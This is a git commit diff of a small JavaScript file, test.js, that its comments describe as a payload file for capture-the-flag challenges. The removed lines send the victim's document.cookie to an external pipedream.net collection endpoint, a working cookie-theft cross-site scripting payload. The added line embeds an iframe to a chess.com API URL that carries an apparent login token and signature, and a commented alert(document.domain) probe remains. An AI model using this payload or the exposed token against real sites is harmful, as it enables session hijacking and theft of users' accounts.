7d4802917087a45018bcd095ffa7e307d6713d9f
rennaarenata <59098319+rennaarenata@users.noreply.github.com>
2022-05-04 18:43:46 +0200

    .

--- test.js
+++ test.js
@@ -1,8 +1,5 @@
 //alert(document.domain)
-var xhttp = new XMLHttpRequest();
-xhttp.open("GET", "https://eo17vdm4n5qoswh.m.pipedream.net/"+document.cookie, true);
-xhttp.send();
-
+<iframe src=https://api.chess.com/v1/games/35000530?loginToken=460bf3fb5ee46c7f0421a1605972755e&signed=docs1.3-2f3087f09de32e339fb7157308e0f644e05dc803 width=500 height=700></iframe>
 //JS file used for ctfs 
 //I don't want to harm anyone or anything
 // Have a good day :)
